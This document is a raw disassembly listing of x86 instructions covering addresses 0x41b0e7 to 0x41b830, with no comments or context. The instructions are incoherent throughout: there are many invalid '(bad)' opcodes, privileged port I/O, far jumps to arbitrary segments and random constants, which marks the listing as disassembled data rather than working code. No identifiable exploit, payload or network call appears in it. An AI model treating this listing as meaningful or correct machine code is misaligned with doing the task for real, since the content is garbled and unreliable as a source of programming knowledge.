  41b0e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b0e8:	aaa    
  41b0e9:	sahf   
  41b0ea:	cmp    ch,cl
  41b0ec:	scas   al,BYTE PTR es:[edi]
  41b0ed:	dec    esp
  41b0ee:	bound  edx,QWORD PTR [eax]
  41b0f0:	leave  
  41b0f1:	and    eax,0x1cd6f2bb
  41b0f6:	xor    DWORD PTR [edx+0x5b],0x76e815d7
  41b0fd:	retf   
  41b0fe:	fbstp  TBYTE PTR [esi]
  41b100:	dec    eax
  41b101:	xor    eax,0x2f4533eb
  41b106:	mov    ah,0x46
  41b108:	dec    ebp
  41b109:	sete   BYTE PTR [edi]
  41b10c:	xlat   BYTE PTR ds:[ebx]
  41b10d:	jns    0x41b11d
  41b10f:	ds adc eax,0xe06fe3e6
  41b115:	mov    DWORD PTR [ebx-0x7305d842],ecx
  41b11b:	adc    eax,0x7267b5b
  41b120:	push   ebp
  41b121:	cwde   
  41b122:	lea    ebx,[ecx-0x5d]
  41b125:	(bad)  
  41b127:	mov    bl,0x62
  41b129:	jnp    0x41b12b
  41b12b:	xchg   edx,eax
  41b12c:	lds    ebp,FWORD PTR [esi+0x32]
  41b12f:	in     al,0x70
  41b131:	out    dx,eax
  41b132:	xchg   ebx,eax
  41b133:	dec    edi
  41b134:	dec    edx
  41b135:	neg    DWORD PTR [ecx-0xbbe5f94]
  41b13b:	js     0x41b17c
  41b13d:	inc    edi
  41b13e:	imul   edx,DWORD PTR [ecx],0x29bea21f
  41b144:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b145:	push   ebx
  41b146:	int    0x2a
  41b148:	inc    ebx
  41b149:	and    eax,0xe561287e
  41b14e:	fcom   DWORD PTR [ecx]
  41b150:	jmp    0x41b154
  41b152:	ret    
  41b153:	xchg   esp,eax
  41b154:	and    BYTE PTR [eax],al
  41b156:	mov    ebp,0x8642f75f
  41b15b:	mov    ch,0xc1
  41b15d:	or     BYTE PTR [edx+ebp*1-0x14e14b6c],ch
  41b164:	inc    esp
  41b165:	inc    edx
  41b166:	sub    al,0x8b
  41b168:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b169:	and    BYTE PTR [ebx],ah
  41b16b:	fsubr  st,st(6)
  41b16d:	jge    0x41b167
  41b16f:	mov    BYTE PTR [ecx+0x22],ah
  41b172:	into   
  41b173:	cs xchg ebp,eax
  41b175:	ja     0x41b1f6
  41b177:	rcl    BYTE PTR gs:[eax],0xcf
  41b17b:	rcl    ch,cl
  41b17d:	(bad)  
  41b17e:	mov    dh,0xb6
  41b180:	xor    BYTE PTR [edx+0x2719b62d],0x7
  41b187:	add    ebp,ebp
  41b189:	out    dx,eax
  41b18a:	loopne 0x41b1b8
  41b18c:	shl    BYTE PTR [edx],1
  41b18e:	mov    dh,BYTE PTR [ebx-0x19cda901]
  41b194:	push   DWORD PTR [ebp-0x3a]
  41b197:	jb     0x41b14f
  41b199:	add    ecx,DWORD PTR [edi+ebp*2]
  41b19c:	in     al,0x99
  41b19e:	dec    ebx
  41b19f:	scas   eax,DWORD PTR es:[edi]
  41b1a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1a1:	ret    0xb22d
  41b1a4:	sahf   
  41b1a5:	shr    eax,0x11
  41b1a8:	dec    ebp
  41b1a9:	pushf  
  41b1aa:	mov    ds:0x10983079,eax
  41b1af:	stos   DWORD PTR es:[edi],eax
  41b1b0:	jmp    0x41b162
  41b1b2:	stc    
  41b1b3:	outs   dx,BYTE PTR ds:[esi]
  41b1b4:	mov    dh,0x31
  41b1b6:	mov    eax,0x8c3d72d6
  41b1bb:	fisttp QWORD PTR [eax]
  41b1bd:	xchg   esp,eax
  41b1be:	les    ebx,FWORD PTR [eax-0x52]
  41b1c1:	push   edx
  41b1c2:	push   0x8b3819e1
  41b1c7:	neg    DWORD PTR ds:0x38041a33
  41b1cd:	aam    0x19
  41b1cf:	sub    BYTE PTR [edi],0x17
  41b1d2:	outs   dx,BYTE PTR ds:[esi]
  41b1d3:	xlat   BYTE PTR gs:[ebx]
  41b1d5:	cmp    eax,0x617dfce3
  41b1da:	push   es
  41b1db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b1dc:	pop    esi
  41b1dd:	mov    fs:0xb7e745c0,eax
  41b1e3:	xchg   edx,eax
  41b1e4:	mov    ah,BYTE PTR [edi]
  41b1e6:	ret    0x63df
  41b1e9:	mov    esi,0x3f009fb2
  41b1ee:	jno    0x41b249
  41b1f0:	imul   ebp,DWORD PTR [ecx],0x8edc264
  41b1f6:	jb     0x41b22d
  41b1f8:	leave  
  41b1f9:	mov    eax,0xf3a3c731
  41b1fe:	(bad)  
  41b1ff:	scas   eax,DWORD PTR es:[edi]
  41b200:	pop    edi
  41b201:	cdq    
  41b202:	dec    esi
  41b203:	not    ch
  41b205:	push   ebx
  41b206:	sbb    ebx,DWORD PTR [edi-0x2c]
  41b209:	int    0x1f
  41b20b:	or     dh,bl
  41b20d:	call   0x87e8833e
  41b212:	and    eax,0x957e1cd6
  41b217:	cli    
  41b218:	retf   0xb7a5
  41b21b:	pushfw 
  41b21d:	lahf   
  41b21e:	popa   
  41b21f:	loopne 0x41b298
  41b221:	aam    0x1e
  41b223:	mov    bl,0x77
  41b225:	and    edx,ecx
  41b227:	mov    ebx,edi
  41b229:	push   ebx
  41b22a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b22b:	xlat   BYTE PTR ds:[ebx]
  41b22c:	sub    eax,0x8bb1d2bc
  41b231:	loop   0x41b221
  41b233:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b234:	xchg   BYTE PTR [esi],cl
  41b236:	dec    ebx
  41b237:	xchg   DWORD PTR [ebp+0x3ef16a66],ecx
  41b23d:	fs mov ch,0xd2
  41b240:	loopne 0x41b1ff
  41b242:	mov    esi,0x30ff775c
  41b247:	add    DWORD PTR [ebx],0x68767c31
  41b24d:	ja     0x41b27a
  41b24f:	push   ss
  41b250:	bound  eax,QWORD PTR [esp+edi*8+0x78711005]
  41b257:	xor    al,0x3b
  41b259:	adc    DWORD PTR [esi-0xcf13690],ebx
  41b25f:	xor    bl,BYTE PTR [edi]
  41b261:	retf   0x70a1
  41b264:	(bad)  
  41b266:	sahf   
  41b267:	out    dx,eax
  41b268:	jne    0x41b2e1
  41b26a:	les    ecx,FWORD PTR [ecx]
  41b26c:	and    BYTE PTR [edx-0x2fd39d84],ah
  41b272:	ja     0x41b1f5
  41b274:	sbb    DWORD PTR [ebx],0x3a218875
  41b27a:	mov    esi,0xe0cab6ba
  41b27f:	arpl   bp,bp
  41b281:	adc    dl,BYTE PTR [edx-0x64]
  41b284:	adc    BYTE PTR [edi],ah
  41b286:	push   eax
  41b287:	shr    edx,1
  41b289:	pop    eax
  41b28a:	xchg   ebx,eax
  41b28b:	xchg   esi,eax
  41b28c:	push   es
  41b28d:	loop   0x41b2e5
  41b28f:	int    0xd5
  41b291:	lods   al,BYTE PTR ds:[esi]
  41b292:	mov    ah,0x4c
  41b294:	push   ss
  41b295:	test   BYTE PTR [ecx+0x69],cl
  41b298:	xor    DWORD PTR [esi],edx
  41b29a:	enter  0xd999,0xd
  41b29e:	leave  
  41b29f:	iret   
  41b2a0:	rcr    BYTE PTR [edi+0x59],cl
  41b2a3:	jb     0x41b2b3
  41b2a5:	jmp    0xfee2:0x4be4177b
  41b2ac:	xchg   DWORD PTR [ebx],edx
  41b2ae:	or     eax,0x7fe96cbd
  41b2b3:	mov    esp,0xcde2f0a5
  41b2b8:	pop    esi
  41b2b9:	int3   
  41b2ba:	popf   
  41b2bb:	xlat   BYTE PTR ds:[ebx]
  41b2bc:	outs   dx,BYTE PTR ds:[esi]
  41b2bd:	pop    ecx
  41b2be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b2bf:	sub    eax,edi
  41b2c1:	imul   ecx,DWORD PTR [ebp+ecx*2+0x1ddde1e2],0x4acadfbf
  41b2cc:	mov    dl,0xe5
  41b2ce:	mov    al,0xac
  41b2d0:	dec    esi
  41b2d1:	loopne 0x41b336
  41b2d3:	inc    edi
  41b2d4:	pop    ebp
  41b2d5:	xlat   BYTE PTR ds:[ebx]
  41b2d6:	xor    bh,BYTE PTR ds:0x370735b8
  41b2dc:	dec    ebx
  41b2dd:	imul   esp,DWORD PTR [edi],0x59
  41b2e0:	retf   
  41b2e1:	enter  0xbaf6,0xba
  41b2e5:	xchg   ecx,eax
  41b2e6:	pop    ecx
  41b2e7:	push   es
  41b2e8:	loopne 0x41b2ce
  41b2ea:	std    
  41b2eb:	fnstcw WORD PTR [edx]
  41b2ed:	mov    fs,WORD PTR [edx-0x64]
  41b2f0:	js     0x41b2b7
  41b2f2:	xchg   ecx,eax
  41b2f3:	aaa    
  41b2f4:	es inc ebx
  41b2f6:	out    0x36,eax
  41b2f8:	or     ebx,DWORD PTR [ebx]
  41b2fa:	sub    al,0xc6
  41b2fc:	and    DWORD PTR [ebx+0x2f9bf9f4],ecx
  41b302:	cmp    al,0xaa
  41b304:	mov    dh,0x9e
  41b306:	push   ss
  41b307:	mov    eax,0xea1f1d5
  41b30c:	dec    ebx
  41b30d:	mov    edi,0x480d697f
  41b312:	ret    0x20ae
  41b315:	or     BYTE PTR [ebp+0x4f6131e5],0x8b
  41b31c:	cli    
  41b31d:	dec    eax
  41b31e:	inc    edi
  41b31f:	sahf   
  41b320:	xchg   ebp,eax
  41b321:	ret    0xcd04
  41b324:	int    0x83
  41b326:	cmp    eax,0x6854c6e5
  41b32b:	xlat   BYTE PTR ds:[ebx]
  41b32c:	cli    
  41b32d:	pop    ecx
  41b32e:	or     dl,al
  41b330:	loopne 0x41b2de
  41b332:	outs   dx,DWORD PTR ds:[esi]
  41b333:	jne    0x41b334
  41b335:	clc    
  41b336:	shr    ebx,0x97
  41b339:	push   es
  41b33a:	sbb    al,0x7d
  41b33c:	imul   esp,ebp,0x8e60a459
  41b342:	mov    dl,0x5e
  41b344:	pop    edi
  41b345:	lds    ebp,FWORD PTR [ebx+0x1c]
  41b348:	ror    BYTE PTR [edx+0x6a],cl
  41b34b:	xchg   edx,eax
  41b34c:	sbb    DWORD PTR [esi+0x611dcca4],edi
  41b352:	xor    DWORD PTR [eax+0x11],esi
  41b355:	xchg   esi,eax
  41b356:	adc    BYTE PTR [edx],0xb3
  41b359:	add    BYTE PTR [ebp-0x6726801a],al
  41b35f:	in     eax,0x1
  41b361:	mov    WORD PTR [ebp-0x34],ss
  41b364:	xor    ebx,DWORD PTR [ecx+0x61]
  41b367:	mov    ebx,ecx
  41b369:	sbb    DWORD PTR [edx],ebp
  41b36b:	jmp    0xf43c:0x8486757b
  41b372:	mov    edx,DWORD PTR fs:[eax-0x7a7cbb5c]
  41b379:	or     eax,0xceafd881
  41b37e:	mov    ds:0x72ed0119,al
  41b383:	and    al,0xb
  41b385:	sub    DWORD PTR [edi],edi
  41b387:	mov    bh,0x4b
  41b389:	and    dl,BYTE PTR [ebp+0x37a99d13]
  41b38f:	sbb    al,0x42
  41b391:	arpl   WORD PTR [ebx],bp
  41b393:	pop    eax
  41b394:	dec    edx
  41b395:	mov    eax,ecx
  41b397:	int3   
  41b398:	div    DWORD PTR [eax+eax*8+0x1b]
  41b39c:	cmp    eax,0x10ee5654
  41b3a1:	out    0x86,eax
  41b3a3:	xlat   BYTE PTR ds:[ebx]
  41b3a4:	idiv   BYTE PTR [ebp+0x22013fc2]
  41b3aa:	pop    esi
  41b3ab:	pop    ds
  41b3ac:	scas   al,BYTE PTR es:[edi]
  41b3ad:	and    eax,ecx
  41b3af:	mov    esi,0xa5277f62
  41b3b4:	xchg   ebx,eax
  41b3b5:	or     cl,BYTE PTR [edx+0x46]
  41b3b8:	cmp    BYTE PTR [edx-0x75],cl
  41b3bb:	jg     0x41b3d5
  41b3bd:	lds    ebx,FWORD PTR [edi+esi*1]
  41b3c0:	in     eax,dx
  41b3c1:	out    0x2c,al
  41b3c3:	out    0x11,eax
  41b3c5:	(bad)  
  41b3c6:	shr    DWORD PTR [eax],cl
  41b3c8:	push   edi
  41b3c9:	inc    ebx
  41b3ca:	mov    edi,0xa7f01514
  41b3cf:	hlt    
  41b3d0:	or     bh,dh
  41b3d2:	jecxz  0x41b3d4
  41b3d4:	sbb    BYTE PTR [esi+0x30a0eb6e],bl
  41b3da:	ss xor edi,DWORD PTR ds:[esi-0x61]
  41b3df:	sbb    BYTE PTR [eax+eax*1],bh
  41b3e2:	out    0x31,al
  41b3e4:	test   DWORD PTR [ecx],eax
  41b3e6:	sbb    DWORD PTR [ecx],esp
  41b3e8:	fcmovnu st,st(1)
  41b3ea:	in     al,0xdf
  41b3ec:	push   ebx
  41b3ed:	int3   
  41b3ee:	je     0x41b442
  41b3f0:	mov    eax,0xe19f2214
  41b3f5:	daa    
  41b3f6:	daa    
  41b3f7:	mov    cl,0x9f
  41b3f9:	inc    ecx
  41b3fa:	lds    edi,FWORD PTR [ebx+0x43]
  41b3fd:	mov    al,0xfb
  41b3ff:	dec    ebx
  41b400:	xchg   ecx,eax
  41b401:	add    al,0xdd
  41b403:	xchg   edx,eax
  41b404:	xchg   ecx,eax
  41b405:	aam    0x56
  41b407:	int3   
  41b408:	and    eax,0xba8e03ca
  41b40d:	push   cs
  41b40e:	dec    ecx
  41b40f:	push   esp
  41b410:	cmc    
  41b411:	js     0x41b430
  41b413:	cdq    
  41b414:	dec    edx
  41b415:	test   DWORD PTR [ecx-0x3d],ebx
  41b418:	cmp    DWORD PTR [ecx+0x56ded2f7],ebx
  41b41e:	cmp    esp,DWORD PTR [ebp-0x7]
  41b421:	pop    edx
  41b422:	cmp    eax,ebx
  41b424:	jmp    0x60c9b828
  41b429:	data16 cmp BYTE PTR [esi-0x1046e9cf],dl
  41b430:	lahf   
  41b431:	jmp    ebx
  41b433:	outs   dx,DWORD PTR ds:[esi]
  41b434:	add    BYTE PTR [edx-0x38215d11],al
  41b43a:	xchg   edi,eax
  41b43b:	call   0xe4008f2e
  41b440:	cld    
  41b441:	pop    ebp
  41b442:	inc    edi
  41b443:	sub    DWORD PTR [ecx+0x32],0xfffffff2
  41b447:	adc    DWORD PTR [ecx],esp
  41b449:	cmp    BYTE PTR [eax],0x1f
  41b44c:	push   cs
  41b44d:	lods   eax,DWORD PTR ds:[esi]
  41b44e:	cld    
  41b44f:	std    
  41b450:	retf   0x9a8
  41b453:	out    dx,al
  41b454:	imul   ebp,DWORD PTR [edi-0x77],0x6b3845de
  41b45b:	dec    al
  41b45d:	jne    0x41b47a
  41b45f:	inc    esi
  41b460:	adc    al,0xb2
  41b462:	inc    ebx
  41b463:	in     al,0x59
  41b465:	inc    esi
  41b466:	add    al,0x2e
  41b468:	add    al,0xa3
  41b46a:	pop    es
  41b46b:	cmc    
  41b46c:	xchg   edx,eax
  41b46d:	cmc    
  41b46e:	and    al,0x89
  41b470:	scas   al,BYTE PTR es:[edi]
  41b471:	es inc esp
  41b473:	out    dx,eax
  41b474:	(bad)  
  41b475:	cmp    BYTE PTR [ebx+0x5e50d48c],dl
  41b47b:	int    0xaf
  41b47d:	mov    al,0xcc
  41b47f:	add    DWORD PTR [eax],0xffffff83
  41b482:	lds    esi,FWORD PTR [esi+0x45aec302]
  41b488:	xchg   esi,eax
  41b489:	mov    dl,0xff
  41b48b:	or     ebx,DWORD PTR [ecx+edx*4-0x4787709e]
  41b492:	iret   
  41b493:	adc    BYTE PTR [esi],cl
  41b495:	adc    BYTE PTR [ebx+0x35],dh
  41b498:	sub    bl,BYTE PTR [ebp-0x17]
  41b49b:	pop    es
  41b49c:	cs stc 
  41b49e:	jg     0x41b4d4
  41b4a0:	jne    0x41b47a
  41b4a2:	lahf   
  41b4a3:	jbe    0x41b4ec
  41b4a5:	shr    BYTE PTR [ecx+0x377b165f],0xa8
  41b4ac:	in     al,dx
  41b4ad:	dec    esp
  41b4ae:	shr    BYTE PTR [esi],1
  41b4b0:	jmp    0x8e2f6164
  41b4b5:	xchg   esp,eax
  41b4b6:	adc    ebx,edx
  41b4b8:	rcl    DWORD PTR [ecx-0x6c],0x87
  41b4bc:	mov    bh,0xf2
  41b4be:	retf   0x32df
  41b4c1:	pop    ebx
  41b4c2:	loope  0x41b465
  41b4c4:	lock icebp 
  41b4c6:	jmp    0x41b471
  41b4c8:	push   ebx
  41b4c9:	cwde   
  41b4ca:	cs pop eax
  41b4cc:	int    0xc9
  41b4ce:	fdiv   QWORD PTR ds:0x2b0e4f67
  41b4d4:	jmp    0x4ed32a09
  41b4d9:	add    al,0x17
  41b4db:	sbb    DWORD PTR ds:0x5c6b8b22,esp
  41b4e1:	jno    0x41b55b
  41b4e3:	sti    
  41b4e4:	cs cld 
  41b4e6:	out    0x9f,al
  41b4e8:	adc    dl,BYTE PTR [ebp+0x611630a1]
  41b4ee:	pop    es
  41b4ef:	data16 outs dx,BYTE PTR ds:[esi]
  41b4f1:	mov    cl,0xc4
  41b4f3:	imul   edx,DWORD PTR [ebx+eax*2],0x2e7163e7
  41b4fa:	and    eax,0x8a2bfc47
  41b4ff:	jle    0x41b578
  41b501:	cli    
  41b502:	push   es
  41b503:	loope  0x41b555
  41b505:	add    al,0x4f
  41b507:	retf   
  41b508:	jnp    0x41b4c5
  41b50a:	and    DWORD PTR [esi+ecx*1],esi
  41b50d:	mov    cl,0x43
  41b50f:	mov    DWORD PTR [edi],edi
  41b511:	neg    DWORD PTR [edx]
  41b513:	adc    al,BYTE PTR [ebx*2-0x67a8294c]
  41b51a:	push   0x56
  41b51c:	pushf  
  41b51d:	jae    0x41b510
  41b51f:	rcl    BYTE PTR [eax+0x49],0xdc
  41b523:	push   esp
  41b524:	inc    esp
  41b525:	xlat   BYTE PTR ds:[ebx]
  41b526:	outs   dx,WORD PTR ds:[esi]
  41b528:	pusha  
  41b529:	stos   BYTE PTR es:[edi],al
  41b52a:	jbe    0x41b4e4
  41b52c:	push   0x4a93a5f3
  41b531:	sbb    ecx,DWORD PTR [ebp+0x4c]
  41b534:	ret    0xf100
  41b537:	pop    ss
  41b538:	mov    bl,0x5
  41b53a:	fucom  st(2)
  41b53c:	bound  edx,QWORD PTR [edx]
  41b53e:	cld    
  41b53f:	clc    
  41b540:	and    dl,BYTE PTR [ebx]
  41b542:	and    eax,0x45cec8d9
  41b547:	je     0x41b580
  41b549:	data16 out 0x4e,al
  41b54c:	and    DWORD PTR [eax+0x3406a44],ecx
  41b552:	cmp    DWORD PTR [edx],esp
  41b554:	test   eax,0xae32e8b9
  41b559:	push   ss
  41b55a:	jmp    0x41b5a0
  41b55c:	push   ebx
  41b55d:	das    
  41b55e:	(bad)  
  41b55f:	cmp    edx,DWORD PTR ds:0x85f2882e
  41b565:	hlt    
  41b566:	das    
  41b567:	cmp    DWORD PTR [esi-0x4eeeae3d],0x759473e6
  41b571:	shl    BYTE PTR [esi-0x3deeb47a],1
  41b577:	mov    edi,0x4affa81
  41b57c:	aas    
  41b57d:	cmp    esp,DWORD PTR cs:[ecx+0x6]
  41b581:	inc    ebx
  41b582:	xchg   edx,eax
  41b583:	jne    0x41b5fb
  41b585:	mov    es,WORD PTR [eax]
  41b587:	sub    eax,0x6f2e58bc
  41b58c:	les    esp,FWORD PTR [ecx+0x6df4f52e]
  41b592:	add    esp,DWORD PTR [edx+0x42c88f84]
  41b598:	mov    WORD PTR [edi-0x4f8e493b],fs
  41b59e:	lods   al,BYTE PTR ds:[esi]
  41b59f:	mov    esi,0xb6c3f269
  41b5a4:	pop    edx
  41b5a5:	sub    cl,BYTE PTR [ebx+ebp*1+0x6c]
  41b5a9:	lahf   
  41b5aa:	(bad)  
  41b5ab:	int3   
  41b5ac:	push   ebp
  41b5ad:	ds mov al,0x54
  41b5b0:	inc    ecx
  41b5b1:	sbb    al,BYTE PTR [ebp-0x2fad6461]
  41b5b7:	inc    ecx
  41b5b8:	cmp    BYTE PTR [esi],0x69
  41b5bb:	popf   
  41b5bc:	dec    edx
  41b5bd:	jns    0x41b5e9
  41b5bf:	pop    ecx
  41b5c0:	ficom  DWORD PTR [ebx-0x1e990417]
  41b5c6:	xlat   BYTE PTR ds:[ebx]
  41b5c7:	jne    0x41b61a
  41b5c9:	js     0x41b5a5
  41b5cb:	imul   edi,DWORD PTR [ecx+0x59],0x1f0fadfb
  41b5d2:	fcmovnb st,st(3)
  41b5d4:	jo     0x41b5ec
  41b5d6:	shl    BYTE PTR [edx+0x5ab531a0],cl
  41b5dc:	and    al,0xf6
  41b5de:	mov    ds,WORD PTR [edx-0x35]
  41b5e1:	clc    
  41b5e2:	out    dx,al
  41b5e3:	and    al,0x2f
  41b5e5:	(bad)  
  41b5e6:	in     eax,0xee
  41b5e8:	sbb    eax,0xa2323d9
  41b5ed:	mov    al,ds:0xc947e406
  41b5f2:	gs dec esi
  41b5f4:	mov    esp,0xc53ebc44
  41b5f9:	jp     0x41b61c
  41b5fb:	bound  esp,QWORD PTR [eax]
  41b5fd:	jae    0x41b5d8
  41b5ff:	ss inc edx
  41b601:	xor    BYTE PTR [ecx+ebx*4],ah
  41b604:	out    dx,al
  41b605:	stc    
  41b606:	mov    ds:0x3f4b844e,eax
  41b60b:	repnz sbb dl,BYTE PTR [ebp+0x78621ef5]
  41b612:	jnp    0x41b686
  41b614:	test   al,0xb9
  41b616:	and    cl,bl
  41b618:	daa    
  41b619:	jbe    0x41b5ec
  41b61b:	(bad)  
  41b61c:	aam    0xfb
  41b61e:	adc    esp,DWORD PTR [eax]
  41b620:	sub    dh,bl
  41b622:	push   eax
  41b623:	adc    BYTE PTR [edx-0x5ca9a76a],bl
  41b629:	jle    0x41b5e2
  41b62b:	sbb    ebp,DWORD PTR [ebx-0x7d]
  41b62e:	cmp    ebp,esp
  41b630:	xchg   ebp,eax
  41b631:	inc    cl
  41b633:	retf   
  41b634:	push   cs
  41b635:	sbb    al,0x53
  41b637:	in     eax,dx
  41b638:	adc    BYTE PTR [ecx],0xa4
  41b63b:	enter  0xc52a,0x20
  41b63f:	scas   eax,DWORD PTR es:[edi]
  41b640:	in     al,0x39
  41b642:	xor    eax,0x71452553
  41b647:	mov    edi,0x490fd69c
  41b64c:	stos   BYTE PTR es:[edi],al
  41b64d:	or     al,0xc2
  41b64f:	out    0x9,al
  41b651:	inc    edi
  41b652:	inc    ebp
  41b653:	mov    ch,0x63
  41b655:	ret    0xfee5
  41b658:	and    eax,0x2e7ff458
  41b65d:	push   esp
  41b65e:	push   0xfffffff8
  41b660:	stc    
  41b661:	mov    esi,0xbb279166
  41b666:	push   ecx
  41b667:	mov    dh,bh
  41b669:	call   0x2a11:0x8be4d73e
  41b670:	aad    0xd0
  41b672:	aad    0xc5
  41b674:	dec    ebp
  41b675:	pusha  
  41b676:	dec    eax
  41b677:	ins    BYTE PTR es:[edi],dx
  41b678:	pop    ecx
  41b679:	mov    cl,0xd8
  41b67b:	jne    0x41b67f
  41b67d:	enter  0x1080,0xe0
  41b681:	pop    edi
  41b682:	and    ecx,DWORD PTR [eax+0x5b1e73cf]
  41b688:	mov    bl,0xb8
  41b68a:	add    bl,bh
  41b68c:	retf   0x830c
  41b68f:	push   ebp
  41b690:	enter  0x2a80,0x44
  41b694:	getsec 
  41b696:	adc    eax,0x432aac67
  41b69b:	sub    ah,BYTE PTR [ebp-0x11e28b95]
  41b6a1:	ins    DWORD PTR es:[edi],dx
  41b6a2:	pusha  
  41b6a3:	ins    BYTE PTR es:[edi],dx
  41b6a4:	in     eax,0x2a
  41b6a6:	sbb    ah,BYTE PTR [edx-0x3b]
  41b6a9:	mov    ebx,0xee5572a1
  41b6ae:	fwait
  41b6af:	mov    ds:0x822ea1be,eax
  41b6b4:	(bad)  [ecx-0x708d7a20]
  41b6ba:	push   esi
  41b6bb:	sub    ebx,DWORD PTR [edx]
  41b6bd:	into   
  41b6be:	fsubr  st,st(0)
  41b6c0:	sub    BYTE PTR [edi+0x37],0x90
  41b6c4:	test   al,0xc8
  41b6c6:	shl    BYTE PTR [edx+0x2e1e564d],cl
  41b6cc:	cs inc edx
  41b6ce:	aam    0xef
  41b6d0:	and    eax,0x261015b8
  41b6d5:	mov    esp,DWORD PTR [ebx+0x10e7546f]
  41b6db:	mov    ebp,0xf6f8f87f
  41b6e0:	lods   eax,DWORD PTR ds:[esi]
  41b6e1:	xchg   edi,eax
  41b6e2:	jl     0x41b721
  41b6e4:	retf   0xc54f
  41b6e7:	pop    edi
  41b6e8:	stos   BYTE PTR es:[edi],al
  41b6e9:	or     eax,0x4e1b6dbc
  41b6ee:	jae    0x41b68a
  41b6f0:	mul    BYTE PTR [ebx-0x33]
  41b6f3:	cdq    
  41b6f4:	sahf   
  41b6f5:	inc    edx
  41b6f6:	jle    0x41b6fe
  41b6f8:	addr16 dec ebp
  41b6fa:	out    dx,al
  41b6fb:	mov    edx,0xa9ff8362
  41b700:	add    esp,0xfffffffd
  41b703:	imul   ecx,eax,0xd265c17b
  41b709:	repnz xor eax,0x9d913f9e
  41b70f:	sahf   
  41b710:	loope  0x41b717
  41b712:	mov    esp,0xc3326e3b
  41b717:	mov    ch,0xfd
  41b719:	dec    ebp
  41b71a:	in     al,dx
  41b71b:	iret   
  41b71c:	repz mov eax,0x9464bd9f
  41b722:	icebp  
  41b723:	sbb    ebx,eax
  41b725:	jae    0x41b6a9
  41b727:	popf   
  41b728:	test   al,0xb4
  41b72a:	not    DWORD PTR [esi+0x10]
  41b72d:	pop    ebx
  41b72e:	rcl    DWORD PTR [eax],cl
  41b730:	jle    0x41b769
  41b732:	cmc    
  41b733:	hlt    
  41b734:	jge    0x41b71c
  41b736:	dec    esi
  41b737:	push   ds
  41b738:	je     0x41b78f
  41b73a:	stos   DWORD PTR es:[edi],eax
  41b73b:	sub    eax,0xcbe4c78
  41b740:	pop    ebp
  41b741:	add    BYTE PTR [esi],al
  41b743:	xchg   ebp,eax
  41b744:	sar    ah,cl
  41b746:	inc    ebp
  41b747:	rcl    DWORD PTR [edi],1
  41b749:	stos   BYTE PTR es:[edi],al
  41b74a:	dec    ebp
  41b74b:	cs sbb al,0xe5
  41b74e:	ret    
  41b74f:	mov    DWORD PTR ds:0x5dad1e5,ebp
  41b755:	inc    ebp
  41b756:	pop    ebp
  41b757:	test   dh,0x16
  41b75a:	dec    edx
  41b75b:	jmp    0x36b1:0x23b71c6d
  41b762:	cmp    edx,DWORD PTR [ebx]
  41b764:	mov    ch,0x5a
  41b766:	pop    ecx
  41b767:	les    esi,FWORD PTR [ebp+0x56]
  41b76a:	mov    BYTE PTR [esi-0x4b],bh
  41b76d:	xchg   edx,eax
  41b76e:	outs   dx,BYTE PTR ds:[esi]
  41b76f:	push   edx
  41b770:	pushf  
  41b771:	rcl    DWORD PTR [edi],1
  41b773:	cmp    edx,edi
  41b775:	sub    al,0xfc
  41b777:	pop    ds
  41b778:	and    BYTE PTR [ebp-0x332b5130],al
  41b77e:	(bad)  [esi+0x45]
  41b781:	jmp    DWORD PTR [esi]
  41b783:	sbb    al,0x41
  41b786:	sub    bl,BYTE PTR gs:[si-0x74]
  41b78b:	sub    eax,0xd3996330
  41b790:	ficomp DWORD PTR [eax+0x6b]
  41b793:	xchg   esp,eax
  41b794:	(bad)
  41b797:	adc    DWORD PTR [edx-0x12],0x229d92a8
  41b79e:	xchg   ebx,eax
  41b79f:	mov    edx,0x7b1c0c8d
  41b7a4:	fidivr WORD PTR [edx+0x67]
  41b7a7:	push   ebp
  41b7a8:	mov    edx,0x65072ebd
  41b7ad:	std    
  41b7ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b7af:	jns    0x41b829
  41b7b1:	add    edi,ebp
  41b7b3:	pop    ecx
  41b7b4:	adc    esp,eax
  41b7b6:	fdiv   DWORD PTR [ecx-0x1219ec05]
  41b7bc:	push   ds
  41b7bd:	ins    DWORD PTR es:[edi],dx
  41b7be:	sahf   
  41b7bf:	or     eax,0x1535e2ec
  41b7c4:	xor    BYTE PTR [ebp+0x56],ch
  41b7c7:	je     0x41b7ac
  41b7c9:	push   ecx
  41b7ca:	scas   al,BYTE PTR es:[edi]
  41b7cb:	mov    cl,0xf7
  41b7cd:	daa    
  41b7ce:	sbb    DWORD PTR [ebp+0xe],ebp
  41b7d1:	stc    
  41b7d2:	push   edi
  41b7d3:	add    cl,ah
  41b7d5:	and    BYTE PTR [edi+0x5b],0xa
  41b7d9:	jae    0x41b7e0
  41b7db:	pushf  
  41b7dc:	rol    DWORD PTR [eax+0x2f],0xd
  41b7e0:	push   ss
  41b7e1:	pop    ebp
  41b7e2:	sbb    eax,0x9b18e2cf
  41b7e7:	leave  
  41b7e8:	mov    WORD PTR [esi*2-0x3bfb5d49],ds
  41b7ef:	ss (bad) 
  41b7f1:	call   ecx
  41b7f3:	test   eax,0x1284e5f8
  41b7f8:	jbe    0x41b85d
  41b7fa:	stc    
  41b7fb:	inc    esp
  41b7fc:	inc    ebx
  41b7fd:	jmp    0xdb12:0xaa6c0999
  41b804:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b805:	pop    ebx
  41b806:	inc    esi
  41b807:	pop    edi
  41b808:	pop    edi
  41b809:	inc    edi
  41b80a:	arpl   WORD PTR [edi+0x71edbf0a],cx
  41b810:	out    0xae,al
  41b812:	scas   eax,DWORD PTR es:[edi]
  41b813:	push   es
  41b814:	test   edx,esp
  41b816:	push   ebp
  41b817:	mov    esi,0x718c53da
  41b81c:	hlt    
  41b81d:	in     al,0xa6
  41b81f:	add    ah,ch
  41b821:	jne    0x41b7e1
  41b823:	pushf  
  41b824:	fisubr WORD PTR [ebp+0x1bfc5]
  41b82a:	nop
  41b82b:	or     eax,0xd03ece5d
  41b830:	mov    ecx,0x4ac26b6
